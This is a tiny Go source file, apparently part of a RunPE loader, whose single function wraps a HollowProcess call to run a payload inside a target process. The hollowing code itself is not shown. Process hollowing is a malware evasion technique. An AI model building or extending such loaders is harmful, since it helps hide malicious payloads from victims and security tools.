package RUNPE

func RUNPE(payloadPath string, targetPath string, arguments string) int {
	pid := 0
	_,pid = HollowProcess(payloadPath, targetPath, arguments)
	return pid
}
